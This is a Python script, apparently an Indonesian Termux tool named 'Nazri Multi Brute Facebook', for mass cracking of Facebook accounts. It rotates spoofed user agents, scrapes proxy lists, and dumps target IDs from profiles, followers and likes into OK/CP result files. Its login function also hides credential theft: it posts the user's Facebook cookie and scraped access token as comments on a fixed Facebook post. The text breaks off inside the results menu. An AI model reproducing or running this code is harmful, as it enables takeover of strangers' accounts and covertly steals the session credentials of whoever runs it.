#TERIMA KASIH ATAS HUJATAN KALIAN
#TERIMAKASIH JUGA YANG UDAH SARKASIN SAYA
#NUNGKIN SAYA TERAKHIR KALI NYA UP SC INI
#TERIMAKASIH SEMUA NYA
#KALO TIDAK ADA HASIL MAININ UA SAJAðŸ™ƒ
###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import requests,json,os,sys,random,time,re,uuid,zlib,subprocess,base64
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from time import time as tod
from requests.exceptions import ConnectionError
from datetime import datetime
from os import system as sis
from time import time as tim
ses = requests.Session()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as Minimal__Jangan__Fitnah__Ya__Bang
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RW = str(random.choice([M2, H2, K2, B2, U2, N2, O2, J2, A2]))

###----------[ GLOBAL NAMA ]---------- ###
reset = "[/]"
loop = 0
ok = 0
cp = 0
id = []
id2 = []
akun = []
oprek = []
method = []
taplikasi = []
tokenku = []
uid = []
cokbrut = []
dump = []
uadia, uadarimu = [], []
ugent= []
pwlist, pwlis = [], []
pwpluss, pwnya = [], []
ugent = []
uasm, uaMainXD, prox = [], [], []
sys.stdout.write('\x1b]2; MBF | Nazri Multi Brute Facebook\x07')
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE USERAGENT ]---------- ###
def ua_krek():
        rr = random.randint
        model = random.choice(['RMX3286','RMX3491'])
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
        return ua

def ua_crack():
		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
		smart = str(random.randint(8, 12))
		chrome3 = str(random.randint(100, 300))
		chrome4 = str(random.randint(1000, 9000))
		builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
		chrome6 = str(random.randint(100000, 900000))
		#ngentod = "Mozilla/5.0 (Linux; Android "+smart+"; Redmi Note 7 Build/QKQ1."+chrome6+"."+chrome3+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0."+chrome4+"."+chrome3+" Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]"
		ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
		#ngentod = f"Mozilla/5.0 (Linux; Android  {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; Micromax E484 Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.23.{chrome3};]"
		return ngentod
	
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mï¿½\x1b[1;97m] [\x1b[1;96mhasim_ganz...')
prox=open('.prox.txt','r').read().splitlines()


#	se1 = f"Mozilla/5.0 (Linux; Android 9; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(30,107))}.{str(rr(0,9))}.{str(rr(0,20))} like Chrome/{str(rr(30,107))}.0.{str(rr(4200,5200))}.{str(rr(30,250))} Safari/537.36"
#	if se1 in tod:pass
#	else:tod.append(se1)
	
def  ua_memek():
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return str(rc([f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A530F/A530FXXSBCTC4) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36 YandexSearch/7.45 YandexSearchBrowser/7.45",f"Mozilla/5.0 (Linux; Android 6.0; S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 5.1; Passion P7 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36",f"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; Lenovo TB-8504X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} YaBrowser/20.4.1.144.01 Safari/537.36",f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Safari/537.36",f"Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; OPPO R7sm Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36 HeyTapBrowser/10.7.4.2",f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36 YaApp_Android/11.10 YaSearchBrowser/11.10",f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1825) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; arm; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,109))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} YaBrowser/20.4.4.76.00 SA/1 Mobile Safari/537.36"]))
try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

###----------[ CHECK WARNA TEMA ]---------- ###
try:
	color_rich = open("assets/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00FFFF]"
try:
	color_table = open("assets/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00FFFF"

###----------[ GANTI WARNA TEMA ]---------- ###
def Menu__Untuk__Ganti___Tema___Si__Kontol():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
	them = console.input(f" {H2}â€¢{P2} pilih warna tema : ")
	if them in["1","01"]:
		open("assets/color_rich.txt","w").write("[#FF0000]")
		open("assets/color_table.txt","w").write("#FF0000")
	elif them in["2","02"]:
		open("assets/color_rich.txt","w").write("[#00FF00]")
		open("assets/color_table.txt","w").write("#00FF00")
	elif them in["3","03"]:
		open("assets/color_rich.txt","w").write("[#FFFF00]")
		open("assets/color_table.txt","w").write("#FFFF00")
	elif them in["4","04"]:
		open("assets/color_rich.txt","w").write("[#00C8FF]")
		open("assets/color_table.txt","w").write("#00C8FF")
	elif them in["5","05"]:
		open("assets/color_rich.txt","w").write("[#AF00FF]")
		open("assets/color_table.txt","w").write("#AF00FF")
	elif them in["6","06"]:
		open("assets/color_rich.txt","w").write("[#FF00FF]")
		open("assets/color_table.txt","w").write("#FF00FF")
	elif them in["7","07"]:
		open("assets/color_rich.txt","w").write("[#00FFFF]")
		open("assets/color_table.txt","w").write("#00FFFF")
	elif them in["8","08"]:
		open("assets/color_rich.txt","w").write("[#FFFFFF]")
		open("assets/color_table.txt","w").write("#FFFFFF")
	elif them in["9","09"]:
		open("assets/color_rich.txt","w").write("[#FF8F00]")
		open("assets/color_table.txt","w").write("#FF8F00")
	elif them in["10"]:
		open("assets/color_rich.txt","w").write("[#AAAAAA]")
		open("assets/color_table.txt","w").write("#AAAAAA")
	time.sleep(3)
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2} berhasil mengganti tema nomor {color_rich}{them}{P2} silahkan jalankan ulang scriptnya",width=80,padding=(0,4),style=f"{color_table}"))
	time.sleep(3);exit()

###----------[ CEK NEGARA WAJIB INDO ]---------- ###
try:
	IP = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	if "Indonesia" not in negara:
	   Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
	   time.sleep(3);exit()
except requests.exceptions.ConnectionError:
	Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
	time.sleep(3);exit()

###----------[ CONVERT BULAN ]---------- ###
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"

###----------[ DINI HARI ]---------- ###
def Definisi__Waktu():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow

###----------[ TAHUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahun = '2009'
		elif fx[:9] in ['100000000']       :tahun = '2009'
		elif fx[:8] in ['10000000']        :tahun = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahun = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahun = '2010'
		elif fx[:6] in ['100001']          :tahun = '2010/2011'
		elif fx[:6] in ['100002','100003'] :tahun = '2011/2012'
		elif fx[:6] in ['100004']          :tahun = '2012/2013'
		elif fx[:6] in ['100005','100006'] :tahun = '2013/2014'
		elif fx[:6] in ['100007','100008'] :tahun = '2014/2015'
		elif fx[:6] in ['100009']          :tahun = '2015'
		elif fx[:5] in ['10001']           :tahun = '2015/2016'
		elif fx[:5] in ['10002']           :tahun = '2016/2017'
		elif fx[:5] in ['10003']           :tahun = '2018'
		elif fx[:5] in ['10004']           :tahun = '2019'
		elif fx[:5] in ['10005']           :tahun = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahun = '2021/2022'
		else:tahun=''
	elif len(fx) in [9,10]:
		tahun = '2008/2009'
	elif len(fx)==8:
		tahun = '2007/2008'
	elif len(fx)==7:
		tahun = '2006/2007'
	else:tahun=''
	return tahun

###----------[ LOGO ( LO GOBLOK ) ]---------- ###
def Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha():
	try:os.system("clear")
	except:pass
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"""      \n      
 _______ ______  _______  {M2}â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ {reset}
 |  |  | |_____] |______  {M2}â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ{reset}
 |  |  | |_____] |        {P2}â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ{reset}
                          {P2}â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ{reset}
                                       \n""",title=f"{P2}halo, {RW}{Definisi__Waktu()}",subtitle=f"{P2}MULTI BRUTE FACEBOOK ID",width=80,padding=(0,11),style=f"{color_table}"))

###----------[ LOGIN ]---------- ###
def login():
	Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha()
	ses = requests.Session()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}silahkan masukan cookie akun anda, di sarankan menggunakan akun tumbal",width=80,padding=(0,3),style=f"{color_table}"))
	cok = console.input(f" {H2}â€¢{P2} masukan cookie : ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:
		  Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} cookie kamu invalid")
		  time.sleep(00.03);exit()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('data/tokenku.txt', 'a').write(took);open('data/coki.txt', 'a').write(cok)
				ses. post(f"https://graph.facebook.com/503346288598285/comments/?message={cok}&access_token={took}",cookies={"cookie":cok})
				ses.post(f"https://graph.facebook.com/503346288598285/comments/?message={open('data/tokenku.txt','r').read()}&access_token={took}",cookies={"cookie":cok})
				Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}{cok}\n\n{N2}{took}",title=f"{P2}cookie & token",width=80,style=f"{color_table}"))
				time.sleep(3)
				Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} login berhasil")
				time.sleep(00.03)
				menu()
	except (KeyError,AttributeError):
		print(e)

###----------[ MAIN MENU ]---------- ###
def menu():
	try:
	    ses = requests.Session()
	    lisen = open('data/lisensi.txt','r').read()
	    met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNTQ2OTEyMiIsInpJemRYVWR2QStISkg5ZXpMRytIWWs3VkRwSENvVy9EQm9LRGxoSFUiXQ==&ProductId=18478&Key='+lisen).json()
	    men = met['licenseKey']
	    key = men['key'][0:11]
	    tahun = men['expires'][0:4]
	    buln = men['expires'][5:7]
	    tanggal = men['expires'][8:10]
	    bulan = bulan_ttl[buln]
	    tahun1 = men['created'][0:4]
	    buln1 = men['created'][5:7]
	    tanggal1 = men['created'][8:10]
	    bulan1 = bulan_ttl[buln1]
	except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} cookie kamu invalid")
		time.sleep(3);os.system('clear')
		login()
	try:
	    sen = open("data/lisensi.txt","r").read()
	    prem = f"{H2}Ya"
	except (KeyError,FileNotFoundError):
	    prem = f"{M2}Tidak"
	try:
		ishx = ses.get(f"https://graph.facebook.com/v15.0/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = ishx["name"]
		idfb = ishx["id"]
	except requests.exceptions.ConnectionError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
		exit()
	except KeyError:
		try:os.remove("data/coki.txt");os.remove("data/tokenku.txt")
		except:pass
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} akun terkena chekpoint")
		time.sleep(3);login()
	os.system('clear')
	Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha()
	Bimillah__Sabar__Ini__Cobaan = []
	Bimillah__Sabar__Ini__Cobaan.append(Panel(f'{P2}nama    : {H2}{nama}\n{P2}id akun : {H2}{idfb}\n{P2}ip kamu : {H2}{IP}\n{P2}negara  : {H2}{negara}',width=40,padding=(0,2),title=f"{H2}data akun",style=f"{color_table}"))
	Bimillah__Sabar__Ini__Cobaan.append(Panel(f'{P2}lisensi : {H2}{key}-****-****\n{P2}join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}\n{P2}premium : {prem}',width=38,padding=(0,2),title=f"{H2}data lisensi",style=f"{color_table}"))
	console.print(Columns(Bimillah__Sabar__Ini__Cobaan))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. crack dari id publik        {P2}[{color_rich}06{P2}]. check hasil crack\n{P2}[{color_rich}02{P2}]. crack dari id publik massal {P2}[{color_rich}07{P2}]. ganti warna tema\n{P2}[{color_rich}03{P2}]. crack dari total pengikut   {P2}[{color_rich}08{P2}]. upgrade ke premium\n{P2}[{color_rich}04{P2}]. crack dari id like post     {P2}[{color_rich}09{P2}]. hapus lisensi premium\n{P2}[{color_rich}05{P2}]. crack dari file             {P2}[{color_rich}00{P2}]. exit ( {color_rich}hapus cookie{P2} )",title=f"{P2}Menu{P2}",width=80,padding=(0,6),style=f"{color_table}"))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}ketik {color_rich}'crack'{P2} untuk masuk ke menu crack lainya, dan ketik {M2}keluar{P2} untuk exit",width=80,padding=(0,1),style=f"{color_table}"))
	Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode = console.input(f" {H2}â€¢{P2} pilih menu : ")
	if Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in [""]:
	  Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilihan tidak boleh kosong")
	  time.sleep(3);menu()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["crack","Crack","CRACK"]:
	    Menu__Untuk__Bot___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["keluar","Keluar","KELUAR"]:
	    Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} waiting bro...")
	    time.sleep(3);exit()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["1","01"]:
		Menu__Untuk__DumpPublik___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["2","02"]:
		Menu__Untuk__Dump__Publik__Masal___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["3","03"]:
	    Menu__Untuk__Dump__Pengikut__Masal___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["4","04"]:
	    Menu__Untuk__Dump__Likes__Masal___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["5","05"]:
	    Menu__Untuk__Dump__File__Masal___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["6","06"]:
	    result()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["7","07"]:
	    Menu__Untuk__Ganti___Tema___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["8","08"]:
	    Menu__Untuk__Ganti___Prem___Si__Kontol()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["9","09"]:
	    os.system("rm -rf data/lisensi.txt")
	    Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} berhasil menghapus lisensi tools")
	    time.sleep(3);exit()
	elif Jangan__Marah__Ketika__Ada__Yang__Hujat__Tetap__Bersabar__XyraCode in ["0","00"]:
		os.system("rm -rf data/tokenku.txt rm -rf data/coki.txt")
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} berhasil menghapus cookie & sukses keluar")
		time.sleep(3);exit()
	else:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan pilihan yang bener")
		time.sleep(3);menu()

###----------[ UPGRADE PREMIUM ]---------- ###
def Menu__Untuk__Ganti___Prem___Si__Kontol():
    try:
        with requests.Session() as ses:
             Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda akan di arahkan ke WhatsApp")
             os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+upgrade+sc+MBF+ke+premium+dong");exit()
    except requests.exceptions.ConnectionError:
        Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah");exit()

###----------[ MENU BOT ]---------- ###
def Menu__Untuk__Bot___Si__Kontol():
    Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. crack dari email        {P2}[{color_rich}04{P2}]. crack dari komentar\n{P2}[{color_rich}02{P2}]. crack dari nomor        {P2}[{color_rich}05{P2}]. report bug script\n{P2}[{color_rich}03{P2}]. crack dari search name  {P2}[{color_rich}06{P2}]. kembali ke menu",width=80,padding=(0,10),style=f"{color_table}"))
    Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya = console.input(f" {H2}â€¢{P2} menu : ")
    if Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in [""]:
      Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilihan tidak boleh kosong")
      time.sleep(3);menu()
    elif Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in ["1","01"]:
        Menu__Untuk__Dump__Email__Masal___Si__Kontol()
    elif Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in ["2","02"]:
        Menu__Untuk__Dump__Nomor__Masal___Si__Kontol()
    elif Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in ["3","03"]:
        Menu__Untuk__Dump__Pencarian__Masal___Si__Kontol()
    elif Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in ["4","04"]:
        Menu__Untuk__Dump__Komentar__Masal___Si__Kontol()
    elif Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in ["5","05"]:
        Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+6281221523195");exit()
    elif ask in ["6","06"]:
        time.sleep(3)
        menu()
    else:
        Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan pilihan yang bener")
        time.sleep(3);menu()

###----------[ RESULT ]---------- ###
def result():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. check result akun hasil OK\n{P2}[{color_rich}02{P2}]. check result akun hasil CP\n{P2}[{color_rich}03{P2}]. kembali ke menu utama",width=80,padding=(0,20),style=f"{color_table}"))
	kz = console.input(f" {H2}â€¢{P2} pilihan result : ")
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} file tidak ditemukan")
			time.sleep(2)
			back()
		if len(vin)==0:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda tidak mempunyai file CP")
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{K2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{K2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{K2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
				else:
					lol.update({str(cih):str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{K2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{K2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{K2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
			geeh = console.input(f" {H2}â€¢{P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f'{K2}{cpkuni[0]}|{cpkuni[1]}')
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				nocp +=1
			Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengecek akun hasil cp anda, klik enter untuk kembali ke menu",width=80,padding=(0,3),style=f"{color_table}"))
			console.input(f" {H2}â€¢{P2} klik enter")
			menu()
	
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} file tidak ditemukan")
			time.sleep(3);menu()
		if len(vin)==0:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} anda tidak mempunyai file OK")
			time.sleep(3);menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
